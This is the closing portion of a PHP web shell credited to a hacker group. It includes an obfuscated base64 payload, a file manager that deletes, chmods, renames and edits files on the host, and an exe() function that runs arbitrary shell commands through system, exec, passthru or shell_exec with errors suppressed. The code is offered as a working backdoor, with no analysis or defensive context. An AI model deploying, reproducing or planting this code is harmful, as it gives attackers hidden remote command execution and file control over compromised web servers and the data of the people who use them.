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')))));
///////////////////////////udah sampe situ aja,, blom di tambahin lagi
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permission</center></td>
<td><center>Modify</center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="pink">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="purple">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="pink">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="purple">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo "
</center>
</body>
</html>";
///////////////
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
//////all functions disini tempatnya/////
function exe($cmd) {    
if(function_exists('system')) {                 
                @ob_start();            
                @system($cmd);          
                $buff = @ob_get_contents();             
                @ob_end_clean();                
                return $buff;   
        } elseif(function_exists('exec')) {             
                @exec($cmd,$results);           
                $buff = "";             
                foreach($results as $result) {                  
                        $buff .= $result;               
                } return $buff;         
        } elseif(function_exists('passthru')) {                 
                @ob_start();            
                @passthru($cmd);                
                $buff = @ob_get_contents();             
                @ob_end_clean();                
                return $buff;   
        } elseif(function_exists('shell_exec')) {               
                $buff = @shell_exec($cmd);              
                return $buff;   
        } 
}
////////////////////////////////////////
echo '<center><br><br>Copyright &copy; 2017 _Tuan2Fay_ | <a href="http://blog.garudasecurityhacker.org/" style="text-decoration:none;">Garuda Security Hacker</a></center>';
?>

